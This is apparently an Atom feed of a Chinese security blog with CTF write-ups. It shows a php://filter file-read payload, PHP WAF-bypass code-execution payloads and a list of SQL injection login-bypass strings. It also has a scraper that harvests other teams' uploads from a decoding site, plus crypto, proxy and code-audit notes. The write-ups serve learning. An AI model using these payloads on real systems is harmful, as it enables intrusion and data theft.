    <title>极客大挑战2019-SecretFile</title>
    <link href="http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/"/>
    <id>http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/</id>
    <published>2020-05-30T03:41:37.000Z</published>
    <updated>2020-05-30T04:01:37.892Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/1.png" alt="1"></p><p>把一切都放在那里了 说明我们需要找到隐藏信息，查看源代码</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/2.png" alt="2"></p><p>发现./Archive_room.php</p><p>打开</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/3.png" alt="3"></p><p>点击secret</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/4.png" alt="4"></p><p>发现查阅结束，没看清么？回去再仔细看看吧。</p><p>多次尝试我们并没有发现有什么变化，那么使用burpsuit抓包</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/5.png" alt="5"></p><p>选择send to repeater</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/6.png" alt="6"></p><p>重放之后发现secr3t.php</p><p>访问</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/7.png" alt="7"></p><p>发现flag.php 访问</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/8.png" alt="8"></p><p>这次什么都没有，源代码中也没有任何发现，但是在secr3t.php中也有过滤，但是我们可以用filter协议，同样可以读取flag.php的内容</p><p>访问/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/9.png" alt="9"></p><p>下边的一串字符就是flag.php的内容的base64形式</p><p>然后base64解码得到</p><pre><code class="html">&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;FLAG&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;        &lt;?php            echo &quot;我就在这里&quot;;            $flag = &#39;flag{99d1cd98-c137-49fd-b4fa-caa468d75d01}&#39;;            $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;        ?&gt;    &lt;/p&gt;&lt;/body&gt;</code></pre><p>提交flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Havefun</title>
    <link href="http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/"/>
    <id>http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/</id>
    <published>2020-05-30T03:28:49.000Z</published>
    <updated>2020-05-30T03:37:31.942Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/1.png" alt="1"></p><p>并没有发现什么有用的信息，查看源代码发现</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/2.png" alt="2"></p><p>当我们传入一个cat参数，就把这个参数的值打印出来，当传入cat=dog时我们发现返回的值是一串类似flag的字符串</p><p>那么我们尝试?cat=dog 得到flag</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>roarctf2019-easy Calc</title>
    <link href="http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/"/>
    <id>http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/</id>
    <published>2020-05-29T04:57:33.000Z</published>
    <updated>2020-05-29T06:48:21.286Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目是这样子的</p><p><img src="https://i.loli.net/2020/05/29/aKvcues4E6b5A2X.jpg" alt="QQ截图20200529130023"></p><p>类似一个计算器</p><p>在源代码中我们看到他增加了一个waf 还发现了calc.php</p><p><img src="https://i.loli.net/2020/05/29/Dk9zKLiOSrx4gTG.jpg" alt="QQ截图20200529130218.jpg"></p><p>打开calc.php可以看到他设置了黑名单</p><p><img src="https://i.loli.net/2020/05/29/UlnXEjeLzJVf2Ax.jpg" alt="QQ截图20200529130500.jpg"></p><p>那么我们就是要想法绕过</p><p>这里我们是选择用PHP的字符串解析来bypass</p><p>构造payload:</p><p>查看目录:calc.php?%20num=var_dump(scandir(chr(47)))</p><p><img src="https://i.loli.net/2020/05/29/xJOg6MXqyvweoSi.png" alt="1.png"></p><p>这里我们发现一个文件f1agg</p><p>读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>得到flag</p><p>这里我们用HTTP走私漏洞同样也可以解这道题</p><p>参考<a href="https://www.plasf.cn/2019/10/16/2019-10-16-HTTP%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-RoarCTF2019-easycalc/" target="_blank" rel="noopener">HTTP走私漏洞</a></p><p><img src="https://i.loli.net/2020/05/29/9LybDktjNHe6gJw.png" alt="2.png"></p><p><img src="https://i.loli.net/2020/05/29/xahgr3f9dWCqG4Z.png" alt="3.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-EasySQL</title>
    <link href="http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/"/>
    <id>http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/</id>
    <published>2020-05-29T04:30:36.000Z</published>
    <updated>2020-05-29T04:41:02.697Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/QQ%E6%88%AA%E5%9B%BE20200529123305.jpg" alt="QQ截图20200529123305"></p><p>根据题目可以知道应该是个sql注入</p><p>先用万能密码尝试</p><p>用户名:admin’or 1=1#</p><p>密码:admin</p><p>登录成功，得到flag</p><p><img src="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/QQ%E6%88%AA%E5%9B%BE20200529123625.jpg" alt="QQ截图20200529123625"></p><p>这里给出一些不同语言类型的万能密码</p><table><thead><tr><th align="left">语言</th><th>万能密码</th></tr></thead><tbody><tr><td align="left">PHP</td><td>‘or 1=1/*<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–</td></tr><tr><td align="left">asp aspx</td><td>“or “a”=”a<br>‘.).or.(‘.a.’=’.a<br>or 1=1–<br>‘or 1=1–<br>a’or’ 1=1–<br>“or 1=1–<br>‘or.’a.’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>or’=’or’</td></tr><tr><td align="left">jsp</td><td>1’or’1’=’1<br>admin’ or 1=1/*</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>利用cloudflareWorkers制作Google镜像站</title>
    <link href="http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/"/>
    <id>http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/</id>
    <published>2020-05-11T01:43:04.000Z</published>
    <updated>2020-05-11T02:53:01.266Z</updated>
    
    <content type="html"><![CDATA[<p>今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份</p><a id="more"></a><p>首先我们需要注册一个Cloudflare账号</p><p>cloudflare官网： <a href="https://www.cloudflare.com/" target="_blank" rel="noopener">https://www.cloudflare.com/</a></p><p>注册登录之后选择workers</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511094942.jpg" alt="QQ截图20200511094942"></p><p>点击创建worker</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095051.jpg" alt="QQ截图20200511095051"></p><p>将下边的代码粘贴到左边代码框</p><pre><code>// Website you intended to retrieve for users.const upstream = &#39;www.google.com&#39;// Custom pathname for the upstream website.const upstream_path = &#39;/&#39;// Website you intended to retrieve for users using mobile devices.const upstream_mobile = &#39;www.google.com&#39;// Countries and regions where you wish to suspend your service.const blocked_region = [&#39;KP&#39;, &#39;SY&#39;, &#39;PK&#39;, &#39;CU&#39;]// IP addresses which you wish to block from using your service.const blocked_ip_address = [&#39;0.0.0.0&#39;, &#39;127.0.0.1&#39;]// Whether to use HTTPS protocol for upstream address.const https = true// Whether to disable cache.const disable_cache = true// Replace texts.const replace_dict = {    &#39;$upstream&#39;: &#39;$custom_domain&#39;,    &#39;//google.com&#39;: &#39;&#39;}addEventListener(&#39;fetch&#39;, event =&gt; {    event.respondWith(fetchAndApply(event.request));})async function fetchAndApply(request) {​    const region = request.headers.get(&#39;cf-ipcountry&#39;).toUpperCase();​    const ip_address = request.headers.get(&#39;cf-connecting-ip&#39;);​    const user_agent = request.headers.get(&#39;user-agent&#39;);​    ​    let response = null;​    let url = new URL(request.url);​    let url_hostname = url.hostname;​    ​    if (https == true) {​        url.protocol = &#39;https:&#39;;​    } else {​        url.protocol = &#39;http:&#39;;​    }​    ​    if (await device_status(user_agent)) {​        var upstream_domain = upstream;​    } else {​        var upstream_domain = upstream_mobile;​    }​    ​    url.host = upstream_domain;​    if (url.pathname == &#39;/&#39;) {​        url.pathname = upstream_path;​    } else {​        url.pathname = upstream_path + url.pathname;​    }​    ​    if (blocked_region.includes(region)) {​        response = new Response(&#39;Access denied: WorkersProxy is not available in your region yet.&#39;, {​            status: 403​        });​    } else if (blocked_ip_address.includes(ip_address)) {​        response = new Response(&#39;Access denied: Your IP address is blocked by WorkersProxy.&#39;, {​            status: 403​        });​    } else {​        let method = request.method;​        let request_headers = request.headers;​        let new_request_headers = new Headers(request_headers);​    ​        new_request_headers.set(&#39;Host&#39;, url.hostname);​        new_request_headers.set(&#39;Referer&#39;, url.hostname);​    ​        let original_response = await fetch(url.href, {​            method: method,​            headers: new_request_headers​        })​    ​        let original_response_clone = original_response.clone();​        let original_text = null;​        let response_headers = original_response.headers;​        let new_response_headers = new Headers(response_headers);​        let status = original_response.status;​        ​        if (disable_cache) {​            new_response_headers.set(&#39;Cache-Control&#39;, &#39;no-store&#39;);​        }​    ​        new_response_headers.set(&#39;access-control-allow-origin&#39;, &#39;*&#39;);​        new_response_headers.set(&#39;access-control-allow-credentials&#39;, true);​        new_response_headers.delete(&#39;content-security-policy&#39;);​        new_response_headers.delete(&#39;content-security-policy-report-only&#39;);​        new_response_headers.delete(&#39;clear-site-data&#39;);​        ​        if(new_response_headers.get(&quot;x-pjax-url&quot;)) {​            new_response_headers.set(&quot;x-pjax-url&quot;, response_headers.get(&quot;x-pjax-url&quot;).replace(&quot;//&quot; + upstream_domain, &quot;//&quot; + url_hostname));​        }​        ​        const content_type = new_response_headers.get(&#39;content-type&#39;);​        if (content_type.includes(&#39;text/html&#39;) &amp;&amp; content_type.includes(&#39;UTF-8&#39;)) {​            original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);​        } else {​            original_text = original_response_clone.body​        }​        ​        response = new Response(original_text, {​            status,​            headers: new_response_headers​        })​    }​    return response;}async function replace_response_text(response, upstream_domain, host_name) {    let text = await response.text()​    var i, j;​    for (i in replace_dict) {​        j = replace_dict[i]​        if (i == &#39;$upstream&#39;) {​            i = upstream_domain​        } else if (i == &#39;$custom_domain&#39;) {​            i = host_name​        }​    ​        if (j == &#39;$upstream&#39;) {​            j = upstream_domain​        } else if (j == &#39;$custom_domain&#39;) {​            j = host_name​        }​    ​        let re = new RegExp(i, &#39;g&#39;)​        text = text.replace(re, j);​    }​    return text;}async function device_status(user_agent_info) {    var agents = [&quot;Android&quot;, &quot;iPhone&quot;, &quot;SymbianOS&quot;, &quot;Windows Phone&quot;, &quot;iPad&quot;, &quot;iPod&quot;];    var flag = true;    for (var v = 0; v &lt; agents.length; v++) {        if (user_agent_info.indexOf(agents[v]) &gt; 0) {            flag = false;            break;        }    }    return flag;}</code></pre><p>左上角项目名可以修改</p><p>然后点击保存并部署就可以了 可以先点击右边的预览查看效果</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095402.jpg" alt="QQ截图20200511095402"></p><p>可以返回首页点击workers来管理</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095646.jpg" alt="QQ截图20200511095646"></p><p>下面是我创建的镜像</p><p><a href="http://gg.d1a0.workers.dev/" target="_blank" rel="noopener">http://gg.d1a0.workers.dev/</a></p><p>虽然Cloudflare Workers 每天只有10万次免费的请求 ,不过也够个人使用了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020网鼎杯青龙组部分wp</title>
    <link href="http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/"/>
    <id>http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/</id>
    <published>2020-05-10T13:10:22.000Z</published>
    <updated>2020-05-11T01:00:06.850Z</updated>
    
    <content type="html"><![CDATA[<p>第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…</p><a id="more"></a><h2 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h2><p>misc签到题给的是个web容器，打开链接</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210516.jpg" alt="QQ截图20200510210516"></p><p>根据上方战队名选择战队图片，有三次错误机会，猜的时间是十秒</p><p>当连续猜对15次之后需要输入战队token</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210711.jpg" alt="QQ截图20200510210711"></p><p>输入token后在控制台找到flag</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210731.jpg" alt="QQ截图20200510210731"></p><h2 id="crypto-boom"><a href="#crypto-boom" class="headerlink" title="crypto boom"></a>crypto boom</h2><p>下载后是个boom.exe 放在cmd中运行</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510211622.jpg" alt="QQ截图20200510211622"></p><p>根据提示，解一次md5，输入结果</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510211814.jpg" alt="QQ截图20200510211814"></p><p>然后解三元一次方程</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510212119.jpg" alt="QQ截图20200510212119"></p><p>再解出x后得到flag(由于不会解，可以直接爆破得到x)</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510212054.jpg" alt="QQ截图20200510212054"></p><h2 id="crypto-you-raise-me-up"><a href="#crypto-you-raise-me-up" class="headerlink" title="crypto you raise me up"></a>crypto you raise me up</h2><p>下载附件后解压是个py脚本</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomn = 2 ** 512m = random.randint(2, n-1) | 1c = pow(m, bytes_to_long(flag), n)print &#39;m = &#39; + str(m)print &#39;c = &#39; + str(c)# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075# c = 66658513942032142458567894507236586325208167916217967759097668952330002340</code></pre><p>可以sage工具的discrete_log解</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510215003.jpg" alt="QQ截图20200510215003"></p><p>discrete_log(mod(c,n),mod(m,n))得56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E5%9B%BE%E7%89%8720200511085512.png" alt="QQ图片20200511085512"></p><p>然后用libnum模块解n2s</p><pre><code class="python">import libnumflag = 56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757print (libnum.n2s(flag))</code></pre><p>得到flag</p><h2 id="misc-虚幻二"><a href="#misc-虚幻二" class="headerlink" title="misc 虚幻二"></a>misc 虚幻二</h2><p>今天差不多全程都在解这个题，实在是不知道怎么拼出汉信码</p><p>下载完附件后用Stegsolve分析，保存green，red和blue三个图层</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/green.png" alt="green"></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/red.png" alt="red"></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/blue.png" alt="blue"></p><p>看不清可以放大处理一下</p><p>其中red和blue都是31 * 10的排列 green是31 * 11的排列方式，那么从green开始，按照green、blue、red循环的方式，每次用一行进行拼接，得到一个31  * 31的图像  然后需要将左上角7 * 7的方块旋转180°，再将整个图像逆时针旋转90° ，旋转之后图片上方有个7 * 10大小的空白区域，就是hint中所说的暴力恢复的地方</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510214431.jpg" alt="QQ截图20200510214431"></p><p>恢复之后如下图</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510214441.jpg" alt="QQ截图20200510214441"></p><p>在线扫码得到flag</p><p>扫码地址:<a href="http://www.efittech.com/hxdec.html" target="_blank" rel="noopener">http://www.efittech.com/hxdec.html</a></p><p>赛后还听说有的战队是直接爬了解码网站，把其他队伍上传的汉信码都爬了下来…emm</p><p>我研究了下确实是可行的，于是在<a href="https://www.cnblogs.com/anweilx/" target="_blank" rel="noopener">@anweilx</a>师傅的指导下也写了批量爬取的脚本在这里贴出来</p><pre><code class="Python">#coding:utf–8import requestsfor m in range (0,61):#取0分到60分    for s in range (0,61):    #取0秒到60秒        url=&quot;http://www.efittech.com/upload/pics/pic_2020051013&quot; + &quot;%02d%02d&quot;%(m ,s )+&quot;.jpg&quot;        #2020051013是时间格式13是13点        获取=requests.get(url)#获取网络请求信息        #获取网络图片二进制流        流=获取.content        #将二进制流保存到图片文件中        if b&quot;\xff\xd8&quot; in 流:        #判断该图片是否存在            file = open(&quot;./汉信码13/&quot; + &quot;%02d%02d&quot;%(m ,s ) +&quot;.jpg&quot;,&quot;wb&quot;)            #将图片命名为分钟+秒数.jpg            file.write(流)            file.close()</code></pre><p>第一次写，写的不好师傅们轻点打</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E5%9B%BE%E7%89%8720200511085611.jpg" alt="QQ图片20200511085611"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客添加文章访问密码</title>
    <link href="http://lingxin16.github.io/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/"/>
    <id>http://lingxin16.github.io/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/</id>
    <published>2020-05-07T10:16:42.000Z</published>
    <updated>2020-05-07T11:53:43.117Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">密码123456</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c424235f0116965c045ec9272bd30cbaa99d71895d570e5710a3fa3a508a4b18">037923a29417dcb57ea278bc904620b7af2caafecbc18a8abcbcb385f4cdb2d9d3fe01425ed8362f1b3775e0f857e6058c4d5366f118747e1bfd1c8489f143eccd0c996f9a06c092b4508b2dc146418255243800bf0a1faded9760885d8a1568efbb32e59a42cf0ecb82c09a9e6f6866dc222a339ff7abdc9acbdc7082934e387c2304681a7210578c032eb4c7781fb4119094557060cb3de8230f6e96e96bd6551892c02329d3f90aa9d061ff25518d8be11dcc15deda07c0ad33a8e727962a339a56cddabb23472049594048036af94c3a75cfbb49b12a7567a2b752c90bd91a1628f4b635164b0b52366e47ac18441fb8bba5a9eaad776e7fae49f7d75b75ac85d84ab4a17edf97c146c862d329f17bfd6a22bbacecf0ee88964dd472bf0c55bd57e08919d719bfa4bac82a26fa056281b0fb429645b4f4f74a4ef9af2680</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码123456
    
    </summary>
    
    
    
      <category term="博客搭建" scheme="http://lingxin16.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day10</title>
    <link href="http://lingxin16.github.io/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day10/"/>
    <id>http://lingxin16.github.io/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day10/</id>
    <published>2020-03-26T13:36:59.000Z</published>
    <updated>2020-05-07T11:35:15.254Z</updated>
    
    <content type="html"><![CDATA[<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><a id="more"></a><p>变量覆盖是指变量未被初始化，我们可以自定义参数值替换程序原有的变量值</p><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h2><pre><code>int extract ( $array , extract_rules,prefix )$array 关联的数组，受第二个和第三个参数的影响extract_rules 对待非法/ 数字和冲突的键名的方法将根据取出标记prefix 仅在第二个参数特殊时需要，添加前缀</code></pre><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><pre><code>EXTR_OVERWRITE-默认。如果有冲突，则覆盖已有的变量。EXTR_SKIP- 如果有冲突，不覆盖已有的变量。( 忽略数组中同名的元素)EXTR_PREFIX_SAME .如果有冲突，在变量名前加上前缀prefix。自PHP4.0.5起，这也包括了对数字索引的处理EXTR_PREFIX_ALL- 给所有变量名加上前缀prefx (第三个参数)EXTR_PREFIX_INVALID -仅在非法或数字变量名前加上前缎prefix。本标记是PHP4.0.5新加的。EXTR_IF_EXISTS- 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经定义了一组合法的变量，然后要从一个数组例如$_REQUEST中提取值覆盖这些变量的场合。本标记是PHP4.2.0新加的。EXTR_PREFIX_IF_EXISTS-仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。本标记是PHP4.2.0新加的。EXTR_REFS-将变量作为引用提取。这有力地表明了导入的变量仍然引用了var_array 参数的值。可以单独使用这个标志或者在extract_type中用OR与其它任何标志结合使用。本标记是PHP4.3.0新加的。</code></pre><h2 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h2><pre><code>void parse_str ( string $encoded_string [, array &amp;$result] )$encoded_string 输入的字符串&amp;$result 